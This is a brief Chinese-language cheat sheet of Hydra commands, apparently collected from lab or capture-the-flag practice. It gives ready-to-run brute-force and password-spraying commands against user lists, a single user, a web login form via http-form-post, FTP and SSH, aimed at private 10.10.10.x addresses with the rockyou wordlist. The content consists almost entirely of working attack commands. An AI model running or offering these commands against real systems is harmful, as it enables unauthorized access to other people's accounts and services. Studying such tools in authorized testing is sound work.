# Hydra 实战语句

- 破解列表

```
    sudo hydra -L users.txt -P wordlist.txt
```

- 破解单个

```
    sudo hydra -l "aaa" -P wordlist.txt
```

- WebSite POST 破解

```
sudo hydra -l "key" -P /usr/share/wordlists/rockyou.txt 10.10.10.7 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key"
```

-  Ftp 密码喷射

```
sudo hydra -L hash/users.lst -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.35 -f
```

- ssh 密码喷射

```
hydra -l sword -P passwords.txt ssh://10.10.10.5 -t 30 -V
```
